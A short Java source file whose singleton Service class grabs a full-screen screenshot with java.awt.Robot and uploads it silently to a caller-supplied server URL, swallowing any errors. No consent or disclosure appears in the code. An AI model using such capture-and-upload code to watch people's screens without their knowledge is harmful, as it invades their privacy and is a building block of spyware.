package sample.service;


import sample.util.MaltiPartRequest;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.IOException;


public class Service {
    private static volatile Service instance;

    private Service() {

    }

    public static Service getInstance() {
        if (instance == null) {
            instance = new Service();
        }
        return instance;
    }


    public BufferedImage captureScreen() throws Exception {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
//        ImageIO.write(image, "png", new File(fileName)); // այս տողը հետագայում ենթակա է քոմենթման
        return image;

    }

    public void senImageToServer(String url, BufferedImage image) {
        MaltiPartRequest maltiPartRequest = null;
        try {
            maltiPartRequest = new MaltiPartRequest(url);
            maltiPartRequest.addFilePart("picture", image);
            maltiPartRequest.finish();
        } catch (IOException e) {
//            e.printStackTrace();
        }


    }


}
